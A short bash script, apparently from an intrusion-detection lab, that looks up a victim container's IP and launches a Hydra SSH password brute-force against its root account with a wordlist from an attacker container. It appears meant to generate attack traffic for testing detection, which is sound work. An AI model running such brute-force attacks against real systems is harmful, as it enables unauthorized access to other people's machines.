#!/usr/bin/env bash
# Launch an SSH brute-force from the attacker against the victim.
# Usage: bash lab/scripts/run_ssh_brute.sh
set -euo pipefail
VICTIM_IP="$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' ids-victim)"
echo "[+] Hydra SSH brute against ${VICTIM_IP}"
docker exec ids-attacker hydra -l root -P /opt/wordlist.txt -t 4 -f "ssh://${VICTIM_IP}"

